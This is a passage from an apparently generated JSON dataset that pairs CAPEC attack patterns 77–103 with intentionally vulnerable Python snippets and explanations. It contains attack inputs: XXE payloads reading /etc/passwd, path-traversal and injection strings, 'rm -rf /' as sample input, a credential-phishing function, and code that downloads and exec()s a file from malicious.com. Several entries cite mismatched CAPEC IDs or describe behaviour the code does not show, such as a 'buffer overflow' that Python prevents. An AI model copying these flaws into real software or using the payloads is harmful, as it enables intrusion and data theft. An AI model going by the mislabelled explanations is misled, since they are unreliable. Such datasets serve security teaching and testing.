        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import os\n\n# Vulnerable code: User-controlled variable directly used without sanitization\nuser_input = input('Enter debug mode (1 for yes, 0 for no): ')\n\n# External control of system setting\nif user_input == '1':\n    os.environ['DEBUG'] = '1'\nelse:\n    os.environ['DEBUG'] = '0'\n\n# Business logic affected by user-controlled variable\nif os.environ['DEBUG'] == '1':\n    print('Debug mode is ON')\nelse:\n    print('Debug mode is OFF')",
        "description": "This Python code snippet demonstrates a vulnerability where a user-controlled variable (user_input) is directly used to set an environment variable (DEBUG) without any sanitization. This represents the CAPEC of 'Manipulating User-Controlled Variables'. The code allows an attacker to control the DEBUG mode of the application, which can lead to various security issues. This example also touches on related CWEs such as CWE-15 (External Control of System or Configuration Setting) and CWE-285 (Improper Authorization), as the user input directly influences the application's behavior and potentially its security posture."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Validate input before canonicalization (CWE-180)\n    if not file_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path')\n    \n    # Canonicalize the path\n    canonical_path = os.path.realpath(file_path)\n    \n    # Validate the canonicalized path\n    if not canonical_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path after canonicalization')\n    \n    # Read the file\n    with open(canonical_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../etc/passwd'  # An attempt to perform path traversal\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding' and associated CWEs. The function `read_file` is intended to read a file from a specified path. It first validates the input path to ensure it starts with '/safe/directory/' (CWE-180). However, it does this validation before canonicalizing the path, which can lead to incorrect validation if the input contains special elements like '../' that can change the path after canonicalization (CWE-22). The code then canonicalizes the path using `os.path.realpath` and re-validates it to ensure it still starts with '/safe/directory/'. If the path is valid, it reads and returns the file content. The example usage shows an attempt to perform a path traversal attack by providing '../etc/passwd' as input, which should be caught by the validation steps."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Improper input validation and handling of alternate encoding\n    if '..' in file_path or '\\' in file_path or '/' in file_path:\n        raise ValueError('Invalid file path')\n    \n    # Incorrect behavior order: validate before canonicalize\n    canonical_path = os.path.realpath(file_path)\n    \n    # External control of file name or path\n    with open(canonical_path, 'r') as file:\n        return file.read()\n\n# Example usage\ntry:\n    content = read_file('..\\etc\\passwd')\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a file reading function that embodies the main idea of CAPEC-147: Using Slashes in Alternate Encoding. The function `read_file` attempts to validate the file path by checking for the presence of '..', '\\', or '/' characters. However, this validation is flawed because it occurs before canonicalizing the path, leading to potential bypasses. Additionally, the function does not properly neutralize special elements, allowing for path traversal attacks. The code also highlights improper input validation and external control of file paths, which are common weaknesses (CWEs) related to this CAPEC."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import os\n\n# Function to validate and sanitize input\ndef validate_and_sanitize_input(user_input):\n    # Validate input length\n    if len(user_input) > 255:\n        raise ValueError(\"Input is too long\")\n    \n    # Attempt to decode input as UTF-8\n    try:\n        decoded_input = user_input.encode('utf-8').decode('utf-8')\n    except UnicodeDecodeError:\n        raise ValueError(\"Invalid UTF-8 encoding\")\n    \n    # Simple validation check (e.g., no special characters)\n    if not decoded_input.isalnum():\n        raise ValueError(\"Input contains invalid characters\")\n    \n    return decoded_input\n\n# Function to use the sanitized input in a file operation\ndef file_operation(user_input):\n    sanitized_input = validate_and_sanitize_input(user_input)\n    # Potentially dangerous file operation\n    file_path = f\"/safe_directory/{sanitized_input}.txt\"\n    with open(file_path, 'w') as file:\n        file.write(\"This is a test file.\")\n\n# Example usage\ntry:\n    user_input = \"../../etc/passwd\\xC0\\xAF..\\xC0\\xAF..\\xC0\\xAF..\\xC0\\xAFetc\\xC0\\xAFpasswd\"\n    file_operation(user_input)\nexcept ValueError as e:\n    print(f\"Error: {e}\")",
        "description": "This Python code snippet demonstrates a potential vulnerability related to using UTF-8 encoding to bypass validation logic. The `validate_and_sanitize_input` function attempts to validate and sanitize user input by checking its length, decoding it as UTF-8, and ensuring it contains only alphanumeric characters. However, the validation is performed before canonicalization, which can lead to bypassing the validation logic using overlong UTF-8 sequences or other encoding tricks. The `file_operation` function uses the sanitized input to construct a file path, which can be exploited if the input is not properly sanitized. The example usage shows how an attacker might use a specially crafted input to bypass the validation and potentially perform a directory traversal attack."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import logging\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n# Configure logging\nlogging.basicConfig(filename='webserver.log', level=logging.INFO)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Log the login attempt\n    logging.info(f'Login attempt: {username}, {password}')\n    return 'Login attempt logged'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet sets up a simple Flask web server with a login endpoint. It logs login attempts, including the username and password, to a file named 'webserver.log'. The code is vulnerable to several issues related to the CAPEC 'Web Server Logs Tampering' and the associated CWEs. Specifically, it does not neutralize or sanitize user inputs before logging them (CWE-117, CWE-93, CWE-75), which could allow an attacker to inject malicious content into the logs. Additionally, the logging of sensitive information like passwords is a security risk (CWE-221). This example demonstrates how improper handling of log data can lead to vulnerabilities in web server logs."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (untrusted source)\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n  <data>&xxe;</data>\n</root>\n'''\n\ntry:\n    # Parse the XML data without validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(root.find('data').text)\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to improper restriction of XML External Entity (XXE) references (CWE-611). The code parses XML data from an untrusted source without validating it against a schema. The XML data contains an external entity that references a local file ('/etc/passwd'). When the XML is parsed, the external entity is expanded, potentially exposing sensitive information. This example embodies the main idea of the deprecated CAPEC, which involves XML content leading to denial of service or other security issues due to improper handling and validation."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <password>admin123</password>\n    </user>\n    <user>\n        <username>user</username>\n        <password>user123</password>\n    </user>\n</users>\n'''\n\n# Parse the XML data\nroot = ET.fromstring(xml_data)\n\n# User input (potentially malicious)\nuser_input = \"' or '1'='1\"\n\n# Vulnerable XPath query\nxpath_query = f\".//user[username/text()='{user_input}']/password/text()\"\n\n# Execute the XPath query\nresult = root.findall(xpath_query)\n\n# Print the result\nfor password in result:\n    print(password.text)",
        "description": "This Python code snippet demonstrates a vulnerable XPath Injection scenario. The code parses a sample XML data containing user credentials and constructs an XPath query using unsanitized user input. The user input is directly embedded into the XPath expression without proper neutralization, allowing an attacker to manipulate the query. In this example, the input \"' or '1'='1\" is used to bypass authentication checks, potentially retrieving all passwords from the XML database. This code highlights the importance of proper input validation and neutralization to prevent XPath Injection attacks."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import lxml.etree as ET\n\n# User input that is not properly sanitized\nuser_input = \"' or '1'='1\"\n\n# Constructing an XQuery expression using unsanitized user input\nxquery = f\"/users/user[username='{user_input}']/data\"\n\n# Load XML data\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <data>Admin Data</data>\n    </user>\n    <user>\n        <username>guest</username>\n        <data>Guest Data</data>\n    </user>\n</users>\n'''\n\ndoc = ET.fromstring(xml_data)\n\n# Execute the XQuery expression\nresult = doc.xpath(xquery)\n\n# Print the result\nfor r in result:\n    print(ET.tostring(r))",
        "description": "This Python code snippet demonstrates an XQuery Injection vulnerability. The code constructs an XQuery expression using unsanitized user input, which can be manipulated by an attacker to alter the query's structure. In this example, the user input is designed to always return true (' or '1'='1'), potentially exposing all user data. The code loads an XML document and executes the constructed XQuery expression, printing the results. This represents the main idea of CAPEC-74, where improper neutralization of special elements in input data can lead to injection attacks, similar to SQL Injection (CWE-89) and XPath Injection (CWE-643)."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "from flask import Flask, request, jsonify\nimport re\n\napp = Flask(__name__)\n\n# Vulnerable endpoint that echoes back user input\n@app.route('/echo', methods=['GET'])\ndef echo():\n    user_input = request.args.get('input', '')\n    # Improper input validation (CWE-20)\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        return 'Invalid input', 400\n    # Improper encoding or escaping of output (CWE-116)\n    response = f'<p>{user_input}</p>'\n    return response\n\n# Vulnerable endpoint that uses less trusted source (CWE-348)\n@app.route('/config', methods=['POST'])\ndef config():\n    config_data = request.form.get('config_data', '')\n    # Static code injection (CWE-96)\n    with open('config.txt', 'w') as f:\n        f.write(config_data)\n    return 'Config updated'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with two endpoints that embody the vulnerabilities described in the CAPEC and related CWEs. The '/echo' endpoint improperly validates user input (CWE-20) and does not correctly encode or escape output (CWE-116), making it susceptible to XSS attacks. The '/config' endpoint accepts configuration data from a less trusted source (CWE-348) and writes it directly to a file without proper sanitization, leading to potential static code injection (CWE-96). These vulnerabilities can be exploited by attackers using AJAX footprinting techniques to gather information and launch further attacks."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    response = make_response(f'<html><body><h1>Welcome!</h1><p>Your user agent is: {user_agent}</p></body></html>')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that reads the 'User-Agent' HTTP header from incoming requests and includes it in the HTML response without proper validation or sanitization. This embodies the main idea of the CAPEC 'XSS Through HTTP Headers' by demonstrating how an attacker could exploit the lack of input neutralization to inject malicious scripts via HTTP headers. The related CWEs highlight the importance of properly neutralizing script-related HTML tags, input during web page generation, and HTTP headers to prevent XSS attacks."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# Simulated user roles\nuser_roles = {\n    'user1': 'admin',\n    'user2': 'user'\n}\n\n# Simulated session\nsession = {'username': 'user2'}\n\n@app.route('/admin')\ndef admin_panel():\n    if session.get('username') != 'user1':\n        return 'Access Denied', 403\n    return 'Welcome to the admin panel'\n\n@app.route('/admin/settings')\ndef admin_settings():\n    # Missing authorization check\n    return 'Admin settings page'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate a vulnerability related to forceful browsing (CAPEC-111). The code defines two routes: '/admin' and '/admin/settings'. The '/admin' route correctly checks if the user is authorized to access the admin panel, but the '/admin/settings' route lacks this authorization check. This allows an attacker to directly access the '/admin/settings' page by entering the URL, bypassing any authorization checks. This example embodies CWE-425 (Direct Request), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a basic example of OS Command Injection vulnerability. The function `execute_command` takes user input and constructs an OS command string without proper validation or neutralization of special elements. The `os.system` function then executes this command. An attacker can exploit this by providing malicious input, such as `; rm -rf /`, to execute arbitrary commands on the underlying operating system. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef is_trusted_host(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        # CWE-346: Origin Validation Error\n        if hostname.endswith('.trusted.com'):\n            return True\n    except socket.herror:\n        pass\n    return False\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\ntrusted_ip = '192.168.1.1'\nif is_trusted_host(trusted_ip):\n    # CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n    user_input = '<script>alert(\"XSS\")</script>'\n    print(f\"<html><body>{user_input}</body></html>\")\n    download_code('http://malicious.com/malware.py')",
        "description": "This Python code snippet demonstrates a scenario where multiple security weaknesses can lead to a pharming attack. The function `is_trusted_host` uses reverse DNS resolution (CWE-350) to verify if an IP address belongs to a trusted domain, but it does not properly validate the origin (CWE-346). If the IP is considered trusted, it proceeds to download and execute code from a URL without checking its integrity (CWE-494). Additionally, it includes a client-side enforcement of security (CWE-602) and improperly neutralizes user input, leading to a potential XSS vulnerability (CWE-79). This combination of weaknesses can be exploited in a pharming attack, where a user is redirected to a malicious site that appears to be trusted."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import socket\n\n# Simulated vulnerable authentication protocol\nclass VulnerableAuthProtocol:\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n    def challenge_response(self, challenge):\n        # Incorrect implementation of authentication algorithm (CWE-303)\n        return challenge + self.secret_key\n\n# Simulated server\nclass Server:\n    def __init__(self, secret_key):\n        self.auth_protocol = VulnerableAuthProtocol(secret_key)\n\n    def authenticate(self, challenge, response):\n        expected_response = self.auth_protocol.challenge_response(challenge)\n        return response == expected_response\n\n# Simulated client\nclass Client:\n    def __init__(self, secret_key):\n        self.auth_protocol = VulnerableAuthProtocol(secret_key)\n\n    def send_challenge(self, server, challenge):\n        response = self.auth_protocol.challenge_response(challenge)\n        return server.authenticate(challenge, response)\n\n# Adversary performing reflection attack\nclass Adversary:\n    def __init__(self, server):\n        self.server = server\n\n    def reflection_attack(self):\n        challenge = 'random_challenge'\n        # Send challenge to server and get response\n        response = self.server.auth_protocol.challenge_response(challenge)\n        # Reflect the response back to the server\n        return self.server.authenticate(challenge, response)\n\n# Example usage\nsecret_key = 'secret'\nserver = Server(secret_key)\nclient = Client(secret_key)\nadversary = Adversary(server)\n\n# Adversary successfully authenticates without knowing the secret key\nif adversary.reflection_attack():\n    print('Reflection attack successful!')\nelse:\n    print('Reflection attack failed.')",
        "description": "This Python code snippet demonstrates a vulnerable authentication protocol susceptible to a reflection attack (CAPEC-301). The `VulnerableAuthProtocol` class simulates an incorrect implementation of an authentication algorithm (CWE-303). The `Server` class uses this protocol to authenticate clients, while the `Client` class simulates a legitimate user. The `Adversary` class performs a reflection attack by sending a challenge to the server, capturing the response, and reflecting it back to the server to gain illegitimate access. This code highlights the vulnerability where an adversary can impersonate a legitimate user by exploiting the reflection attack during the authentication process."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable to XSS in IMG tags\n    html_content = f'<img src=\"{user_input}\" />'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks through the improper neutralization of script in attributes of IMG tags (CWE-82). The application takes user input from a query parameter 'input' and directly inserts it into the 'src' attribute of an IMG tag without any sanitization or validation. This allows an attacker to inject malicious scripts, leading to XSS attacks. The code also highlights the risk of using incomplete denylist mechanisms (CWE-692) and improper neutralization of special characters (CWE-80), as it does not handle alternate XSS syntax (CWE-87) or doubled character manipulations (CWE-85)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "import sys\n\n# Function to simulate forced integer overflow\n\ndef allocate_memory(size):\n    # Simulate an integer overflow by using a large value\n    if size > sys.maxsize:\n        size = size - sys.maxsize - 1\n    \n    # Allocate memory based on the (potentially overflowed) size\n    try:\n        buffer = bytearray(size)\n        print(f\"Allocated {size} bytes of memory.\")\n    except MemoryError:\n        print(\"Memory allocation failed.\")\n\n# Example usage\nuser_input = int(input(\"Enter the size of memory to allocate: \"))\nallocate_memory(user_input)\n",
        "description": "This Python code snippet demonstrates a forced integer overflow vulnerability. The `allocate_memory` function takes a size parameter and simulates an integer overflow by subtracting `sys.maxsize` from the size if it exceeds the maximum allowable integer value. This can lead to incorrect memory allocation, potentially causing a buffer overflow. The code represents the main idea of CAPEC-190 (Forced Integer Overflow) and incorporates related CWEs such as CWE-190 (Integer Overflow or Wraparound) and CWE-680 (Integer Overflow to Buffer Overflow). The user is prompted to input a size, which is then used to allocate memory, potentially leading to unexpected behavior if the size is manipulated to cause an overflow."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\n# Configure logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to log user input\ndef log_user_action(user_input):\n    # CWE-117: Improper Output Neutralization for Logs\n    # CWE-75: Failure to Sanitize Special Elements into a Different Plane\n    # CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n    logging.info(f'User action: {user_input}')\n\n# Example of user input that could be malicious\nuser_input = \"User logged in; DROP TABLE users; --\"\nlog_user_action(user_input)\n\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-779: Logging of Excessive Data\nsensitive_info = \"User password: secret_password\"\nlogging.info(f'Sensitive info: {sensitive_info}')",
        "description": "This Python code snippet demonstrates a logging mechanism that is vulnerable to log injection, tampering, and forging attacks. The `log_user_action` function logs user input directly without proper sanitization or neutralization, making it susceptible to CWE-117, CWE-75, and CWE-150. An example of potentially malicious user input is provided, which could manipulate the log file. Additionally, the code logs sensitive information (CWE-532) and excessive data (CWE-779), which could be exploited by an attacker. This snippet highlights the importance of properly sanitizing and neutralizing log entries to prevent log-based attacks."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\n# Create a context with improper SSL settings\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\ncontext.verify_mode = ssl.CERT_NONE  # CWE-287: Improper Authentication\n\n# Create a socket and wrap it with SSL\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8443))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    ssl_socket = context.wrap_socket(client_socket, server_side=True)\n    data = ssl_socket.recv(1024)\n    print(f\"Received data: {data}\")  # CWE-300: Channel Accessible by Non-Endpoint\n    # CWE-294: Authentication Bypass by Capture-replay\n    ssl_socket.sendall(data)  # Echo back the data\n    ssl_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server setup that embodies the 'Adversary in the Middle (AiTM)' attack pattern. The server uses an SSL context with improper settings (CWE-287: Improper Authentication) by not verifying client certificates (context.verify_mode = ssl.CERT_NONE). This allows an adversary to intercept and manipulate the communication channel (CWE-300: Channel Accessible by Non-Endpoint). The server simply echoes back any received data, which can be exploited by an attacker to perform capture-replay attacks (CWE-294: Authentication Bypass by Capture-replay). The code highlights the risks of not adequately securing communication channels and verifying endpoints."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import requests\n\n# URL of the WSDL file\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Fetch the WSDL file\nresponse = requests.get(wsdl_url)\n\n# Check if the WSDL file is accessible\nif response.status_code == 200:\n    wsdl_content = response.text\n    print('WSDL file content:')\n    print(wsdl_content)\n\n    # Example of scanning for sensitive information\n    if 'password' in wsdl_content or 'secret' in wsdl_content:\n        print('Sensitive information found in WSDL file!')\nelse:\n    print('Failed to access WSDL file')",
        "description": "This Python code snippet demonstrates how an attacker might scan a WSDL (Web Services Description Language) file to reveal sensitive information. The code fetches the WSDL file from a specified URL and checks if it is accessible. If accessible, it prints the content of the WSDL file and scans for sensitive information such as 'password' or 'secret'. This embodies the main idea of CAPEC-111 (WSDL Scanning) and highlights related CWEs such as CWE-651 (Exposure of WSDL File Containing Sensitive Information) and CWE-538 (Insertion of Sensitive Information into Externally-Accessible File or Directory). The code represents a potential vulnerability where sensitive information might be exposed through the WSDL file, which can be exploited for further attacks."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import os\n\n# Attempt to use a third-party library\ntry:\n    import some_third_party_lib\nexcept ImportError:\n    print(\"Error: Required library 'some_third_party_lib' is not available.\")\n    # Fallback to a non-ubiquitous API function\n    try:\n        os.some_non_ubiquitous_function()\n    except AttributeError:\n        print(\"Error: Fallback function is not available on this platform.\")\n        # Improper error handling leading to potential insecure state\n        exit(1)\n\n# Use of prohibited code\ntry:\n    some_third_party_lib.prohibited_function()\nexcept AttributeError:\n    print(\"Error: Prohibited function is not available.\")\n    exit(1)\n\n# Use of blocking code in a single-threaded context\nimport time\n\ndef blocking_operation():\n    time.sleep(10)  # Simulate a blocking operation\n\nblocking_operation()\n\n# Inclusion of functionality from an untrusted source\ntry:\n    exec(open('/path/to/untrusted/script.py').read())\nexcept FileNotFoundError:\n    print(\"Error: Untrusted script not found.\")\n    exit(1)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Block Access to Libraries' and the associated CWEs. The code attempts to import a third-party library and handles the ImportError by falling back to a non-ubiquitous API function, which may not exist on all platforms, leading to an AttributeError. It also includes the use of a prohibited function from the third-party library, which is not handled properly. Additionally, the code contains a blocking operation in a single-threaded context, which can lead to performance issues. Finally, the code attempts to execute a script from an untrusted source, which can introduce security risks. The overall idea is to show how improper handling of library access and related issues can leave the system in an insecure state."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\n# Use of a weak key (CWE-327)\nkey = b'weakkey12345678'  # 128-bit key\n\n# Use of a predictable IV (CWE-1204)\niv = b'0000000000000000'  # 16 bytes IV\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'This is a secret message'\nciphertext = cipher.encrypt(pad(plaintext, AES.block_size))\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Decrypting data\ncipher = AES.new(key, AES.MODE_CBC, iv)\ndecrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)\nprint(f'Decrypted: {decrypted.decode()}')",
        "description": "This Python code snippet demonstrates a cryptographic operation that is vulnerable to cryptanalysis due to the use of weak and predictable cryptographic elements. The code uses a weak key (CWE-327) and a predictable initialization vector (IV) (CWE-1204) for AES encryption in CBC mode. The weak key and predictable IV make the encryption susceptible to attacks, as they do not provide sufficient security. This example embodies the main idea of CAPEC-189 (Cryptanalysis) by illustrating how improper application of cryptographic algorithms can lead to vulnerabilities."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import requests\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n\ndef phishing_attack(user_input):\n    # CWE-601: Open Redirect\n    malicious_url = f\"http://malicious-site.com?redirect={user_input}\"\n    response = requests.get(malicious_url)\n\n    # CWE-451: UI Misrepresentation\n    if response.status_code == 200:\n        print(\"Login to your bank account to verify your identity.\")\n        user_credentials = input(\"Enter your credentials: \")\n\n        # CWE-506: Embedded Malicious Code\n        # CWE-507: Trojan Horse\n        # CWE-512: Spyware\n        with open(\"credentials.txt\", \"w\") as file:\n            file.write(user_credentials)\n\n        print(\"Thank you! Your identity has been verified.\")\n\n# Simulate user input\nuser_input = \"http://legitimate-site.com\"\nphishing_attack(user_input)",
        "description": "This Python code snippet demonstrates a simple phishing attack. The function `phishing_attack` takes user input, which is a URL, and constructs a malicious URL that redirects to a phishing site (CWE-601). The user is then prompted to enter their credentials under the guise of verifying their identity (CWE-451). The entered credentials are saved to a file, representing embedded malicious code (CWE-506), a Trojan Horse (CWE-507), and spyware (CWE-512). This code embodies the main idea of phishing by masquerading as a legitimate entity to gather confidential information."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (could be from an untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ntry:\n    # Parsing the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"XML parsing error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to XML External Entity (XXE) attacks, which is a type of XML Parser Attack. The code uses the xml.etree.ElementTree module to parse XML data that includes an external entity reference. The XML data contains a DOCTYPE declaration that defines an entity 'xxe' which references the local file '/etc/passwd'. When the XML is parsed without proper validation, the external entity is processed, potentially exposing sensitive information. This example highlights the importance of validating and sanitizing XML inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "import struct\n\ndef vulnerable_function(data):\n    buffer = bytearray(10)  # Fixed-size buffer\n    for i in range(len(data)):\n        buffer[i] = data[i]  # No bounds checking\n\n# Example usage\nuser_input = b'A' * 20  # Input larger than buffer size\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function `vulnerable_function` takes an input `data` and attempts to copy it into a fixed-size buffer of 10 bytes. However, there is no bounds checking to ensure that the input data fits within the buffer. If the input data exceeds the buffer size, it will write past the buffer's boundaries, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The provided user input `b'A' * 20` is larger than the buffer size, which will trigger the overflow."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET', 'POST'])\ndef vulnerable():\n    if request.method == 'POST':\n        user_input = request.form['user_input']\n        # Vulnerable to SSI Injection\n        response = render_template_string(\"\"\"\n        <!--#echo var='{{ user_input }}' -->\n        \"\"\", user_input=user_input)\n        return response\n    return '''\n        <form method=\"post\">\n            <input type=\"text\" name=\"user_input\">\n            <input type=\"submit\">\n        </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Server Side Include (SSI) Injection. The application has a single route '/vulnerable' that accepts both GET and POST requests. When a POST request is made, the user input is directly embedded into a server-side include directive without proper neutralization, making it susceptible to SSI Injection attacks. This can allow an attacker to execute arbitrary code or access sensitive files on the server. The code embodies the main idea of CAPEC-97 and related CWEs, such as improper neutralization of server-side includes (CWE-97), improper input validation (CWE-20), and injection (CWE-74)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import http.client\nimport urllib.parse\n\n# Simulate a login request with credentials sent in cleartext\nconn = http.client.HTTPConnection('example.com')\nparams = urllib.parse.urlencode({'username': 'user', 'password': 'pass'})\nheaders = {'Content-type': 'application/x-www-form-urlencoded'}\nconn.request('POST', '/login', params, headers)\nresponse = conn.getresponse()\n\n# Capture the session token from the response (assuming it's in a cookie)\nset_cookie = response.getheader('Set-Cookie')\nsession_token = set_cookie.split(';')[0].split('=')[1]\n\n# Use the captured session token to perform an authenticated request\nheaders = {'Cookie': f'session={session_token}'}\nconn.request('GET', '/sensitive-data', headers=headers)\nresponse = conn.getresponse()\ndata = response.read()\nprint(data.decode('utf-8'))\n\nconn.close()",
        "description": "This Python code snippet demonstrates a simplified version of a session sidejacking attack. It first sends a login request to a server using HTTP, which transmits the credentials in cleartext (CWE-319, CWE-523). The response from the server includes a session token in a Set-Cookie header. The code captures this session token and uses it to make an authenticated request to access sensitive data, simulating the attack described in CAPEC-Session Sidejacking. This example highlights the vulnerabilities of unprotected transport of credentials and insufficiently protected credentials (CWE-522, CWE-614)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
